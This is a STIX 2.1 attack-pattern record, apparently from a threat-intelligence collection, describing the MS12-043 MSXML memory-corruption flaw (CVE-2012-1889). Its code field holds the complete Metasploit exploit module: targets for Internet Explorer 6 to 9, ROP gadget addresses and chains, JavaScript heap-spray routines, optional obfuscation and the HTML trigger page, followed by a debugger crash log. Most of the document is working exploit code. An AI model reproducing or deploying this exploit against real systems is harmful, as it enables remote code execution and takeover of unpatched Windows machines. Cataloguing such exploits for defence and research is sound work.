{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1e225e8-38b3-4061-a347-6dd5aa6bf7c9",
    "created": "2024-08-14T16:41:09.18446Z",
    "modified": "2024-08-14T16:41:09.184464Z",
    "name": "\"MS12-043 Microsoft XML Core Services MSXML Uninitialized Memory Corruption\"",
    "description": " This module exploits a memory corruption flaw in Microsoft XML Core Services when trying to access an uninitialized Node with the getDefinition API, which may corrupt memory allowing remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/msxml_get_definition_code_exec.rb",
            "external_id": "msxml_get_definition_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1889"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/advisory/2719615"
        },
        {
            "source_name": "reference",
            "url": "http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmail-accounts/12462"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/06/18/metasploit-exploits-critical-microsoft-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name    => HttpClients::IE,\n    :ua_minver  => \"6.0\",\n    :ua_maxver  => \"9.0\",\n    :javascript => true,\n    :os_name    => OperatingSystems::Match::WINDOWS,\n    :classid    => \"{f6D90f11-9c73-11d3-b32e-00C04f990bb4}\",\n    :method     => \"definition\",\n    :rank       => GoodRanking\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS12-043 Microsoft XML Core Services MSXML Uninitialized Memory Corruption\",\n      'Description'    => %q{\n          This module exploits a memory corruption flaw in Microsoft XML Core Services\n        when trying to access an uninitialized Node with the getDefinition API, which\n        may corrupt memory allowing remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'inking26', # Reliable exploitation\n          'binjo', # Metasploit module\n          'sinn3r',  # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-1889' ],\n          [ 'BID', '53934' ],\n          [ 'OSVDB', '82873'],\n          [ 'MSB', 'MS12-043'],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2719615' ],\n          [ 'URL', 'http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmail-accounts/12462' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/06/18/metasploit-exploits-critical-microsoft-vulnerabilities' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n          'Space'    => 1024\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # msxml3.dll 8.90.1101.0\n          [ 'Automatic', {} ],\n          [\n            'IE 6 on Windows XP SP3',\n            {\n              'Offset' => '0x100',\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 7 on Windows XP SP3 / Vista SP2',\n            {\n              'Offset' => '0x100',\n              'Rop' => nil,\n              'RandomHeap' => false\n            }\n          ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'Rop' => :msvcrt,\n              'RandomHeap' => false,\n              'RopChainOffset' => '0x5f4',\n              'Offset' => '0x0',\n              'StackPivot' => 0x77c15ed5, # xchg eax, esp # ret # from msvcrt.dll\n            }\n          ],\n          [\n            'IE 8 with Java 6 on Windows XP SP3',\n            {\n              'Rop' => :jre,\n              'RandomHeap' => false,\n              'RopChainOffset' => '0x5f4',\n              'Offset' => '0x0',\n              'StackPivot' => 0x7c348b05 # xchg eax, esp # ret # from msvcr71.dll\n            }\n          ],\n          [\n            'IE 8 with Java 6 on Windows 7 SP1/Vista SP2',\n            {\n              'Rop' => :jre,\n              'RandomHeap' => false,\n              'RopChainOffset' => '0x5f4',\n              'Offset' => '0x0',\n              'StackPivot' => 0x7c348b05 # xchg eax, esp # ret # from msvcr71.dll\n            }\n          ],\n          [\n            'IE 9 with Java 6 on Windows 7 SP1',\n            {\n              'Rop' => :jre,\n              'RandomHeap' => true,\n              'RopChainOffset' => 0x5FC,\n              'Offset' => '0x0',\n              'StackPivot' => 0x7c348b05 # xchg eax, esp # ret # from msvcr71.dll\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows Vista SP2\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8/\n      return targets[3]  #IE 8 on Windows XP SP3\n    elsif agent =~ /NT 6\\.[01]/ and agent =~ /MSIE 8/\n      return targets[5]  #IE 8 on Windows 7 SP1/Vista SP2\n    elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 9/\n      return targets[6]  #IE 9 on Windows 7 SP1\n    else\n      return nil\n    end\n  end\n\n  def ret(t)\n    case t['Rop']\n      when :msvcrt\n        return [ 0x77c4ec01 ].pack(\"V\") # RETN (ROP NOP) # msvcrt.dll\n      when :jre\n        return [ 0x7c347f98 ].pack(\"V\") # RETN (ROP NOP) # msvcr71.dll\n    end\n  end\n\n  def popret(t)\n    case t['Rop']\n      when :msvcrt\n        return [ 0x77c4ec00 ].pack(\"V\") # POP EBP # RETN (ROP NOP) # msvcrt.dll\n      when :jre\n        return [ 0x7c376541 ].pack(\"V\") # POP EBP # RETN (ROP NOP) # msvcr71.dll\n    end\n  end\n\n  def get_rop_chain(t)\n    if t['RandomHeap']\n      adjust = [ 0x0c0c0c0c ].pack(\"V\") # heap isn't filled with pointers to 0x0c0c0c0c\n      adjust << ret(t)\n    else\n      adjust = ret(t)\n    end\n\n    adjust << popret(t)\n    adjust << [ t['StackPivot'] ].pack(\"V\")\n    adjust << ret(t) * 4 # first call to a \"ret\" because there is a good gadget in the stack :)\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n      when :msvcrt\n        print_status(\"Using msvcrt ROP\")\n        rop = generate_rop_payload('msvcrt','',{'target'=>'xp', 'pivot'=>adjust})\n\n      else\n        print_status(\"Using JRE ROP\")\n        rop = generate_rop_payload('java','',{'pivot'=>adjust})\n    end\n\n    return rop\n  end\n\n  def get_easy_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < 0x230; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n\n  def get_aligned_spray(t, js_rop, js_code, js_nops, js_90_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n    randnop2 = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n    var #{randnop2} = \"#{js_90_nops}\";\n    var nops_90 = unescape(#{randnop2});\n    var rop_chain = unescape(\"#{js_rop}\");\n\n    while (nops.length < 0x80000) nops += nops;\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var nops_padding = nops.substring(0, #{t['RopChainOffset']}-code.length-offset.length);\n    var shellcode = offset + code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);\n\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n\n    heap_obj.gc();\n    for (var z=1; z < 0x230; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  # Spray published by corelanc0d3r\n  # Exploit writing tutorial part 11 : Heap Spraying Demystified\n  # See https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/\n  def get_random_spray(t, js_rop, js_code, js_90_nops)\n\n    spray = <<-JS\n\n    function randomblock(blocksize)\n    {\n      var theblock = \"\";\n      for (var i = 0; i < blocksize; i++)\n      {\n        theblock += Math.floor(Math.random()*90)+10;\n      }\n      return theblock;\n    }\n\n    function tounescape(block)\n    {\n      var blocklen = block.length;\n      var unescapestr = \"\";\n      for (var i = 0; i < blocklen-1; i=i+4)\n      {\n        unescapestr += \"%u\" + block.substring(i,i+4);\n      }\n      return unescapestr;\n    }\n\n    var heap_obj = new heapLib.ie(0x10000);\n\n    var rop = unescape(\"#{js_rop}\");\n    var code = unescape(\"#{js_code}\");\n    var #{randnop2} = \"#{js_90_nops}\";\n    var nops_90 = unescape(#{randnop2});\n\n    while (nops_90.length < 0x80000) nops_90 += nops_90;\n\n    var offset_length = #{t['RopChainOffset']};\n\n    for (var i=0; i < 0x1000; i++) {\n      var padding = unescape(tounescape(randomblock(0x1000)));\n      while (padding.length < 0x1000) padding+= padding;\n      var junk_offset = padding.substring(0, offset_length - code.length);\n      var single_sprayblock = code + junk_offset + rop + nops_90.substring(0, 0x800 - code.length - junk_offset.length - rop.length);\n      while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n      sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n      heap_obj.alloc(sprayblock);\n    }\n\n    JS\n\n    return spray\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n\n\n    if not my_target['Rop'].nil?\n      js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))\n    end\n\n    if my_target['RandomHeap']\n      js = get_random_spray(my_target, js_rop, js_code, js_90_nops)\n    elsif not my_target['Rop'].nil?\n      js = get_aligned_spray(my_target, js_rop, js_code, js_nops, js_90_nops)\n    else\n      js = get_easy_spray(my_target, js_code, js_nops)\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    object_id = rand_text_alpha(4)\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid=\"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4\" id=\"#{object_id}\"></object>\n    <script>\n    var obj = document.getElementById('#{object_id}').object;\n    var src = unescape(\"%u0c08%u0c0c\");\n    while (src.length < 0x1002) src += src;\n    src = \"\\\\\\\\\\\\\\\\xxx\" + src;\n    src = src.substr(0, 0x1000 - 10);\n    var pic = document.createElement(\"img\");\n    pic.src = src;\n    pic.nameProp;\n    obj.definition(#{rand(999) + 1});\n    </script>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"#{cli.peerhost}:#{cli.peerport} - Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\n(e34.358): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=7498670c ebx=00000000 ecx=5f5ec68b edx=00000001 esi=7498670c edi=0013e350\neip=749bd772 esp=0013e010 ebp=0013e14c iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nmsxml3!_dispatchImpl::InvokeHelper+0xb4:\n749bd772 ff5118          call    dword ptr [ecx+18h]  ds:0023:5f5ec6a3=????????\n\n\n0:008> r\neax=020bf2f0 ebx=00000000 ecx=00000000 edx=00000001 esi=020bf2f0 edi=020bf528\neip=749bd772 esp=020bf1a8 ebp=020bf2e4 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nmsxml3!_dispatchImpl::InvokeHelper+0xb4:\n749bd772 ff5118          call    dword ptr [ecx+18h]  ds:0023:00000018=????????\n0:008> k\nChildEBP RetAddr\n020bf2e4 749bdb13 msxml3!_dispatchImpl::InvokeHelper+0xb4\n020bf320 749d4d84 msxml3!_dispatchImpl::Invoke+0x5e\n020bf360 749dcae4 msxml3!DOMNode::Invoke+0xaa\n020bf394 749bd5aa msxml3!DOMDocumentWrapper::Invoke+0x50\n020bf3f0 749d6e6c msxml3!_dispatchImpl::InvokeEx+0xfa\n020bf420 633a6d37 msxml3!_dispatchEx<IXMLDOMNode,&LIBID_MSXML2,&IID_IXMLDOMNode,0>::InvokeEx+0x2d\n020bf460 633a6c75 jscript!IDispatchExInvokeEx2+0xf8\n020bf49c 633a9cfe jscript!IDispatchExInvokeEx+0x6a\n020bf55c 633a9f3c jscript!InvokeDispatchEx+0x98\n020bf590 633a77ff jscript!VAR::InvokeByName+0x135\n020bf5dc 633a85c7 jscript!VAR::InvokeDispName+0x7a\n020bf60c 633a9c0b jscript!VAR::InvokeByDispID+0xce\n020bf7a8 633a5ab0 jscript!CScriptRuntime::Run+0x2989\n020bf890 633a59f7 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020bf8dc 633a5743 jscript!ScrFncObj::Call+0x8f\n020bf958 633891f1 jscript!CSession::Execute+0x175\n020bf9a4 63388f65 jscript!COleScript::ExecutePendingScripts+0x1c0\n020bfa08 63388d7f jscript!COleScript::ParseScriptTextCore+0x29a\n020bfa30 635bf025 jscript!COleScript::ParseScriptText+0x30\n020bfa88 635be7ca mshtml!CScriptCollection::ParseScriptText+0x219\n\n=end\n",
    "x_mitre_disclosure_date": "2012-06-12",
    "x_mitre_platforms": [
        "win'"
    ]
}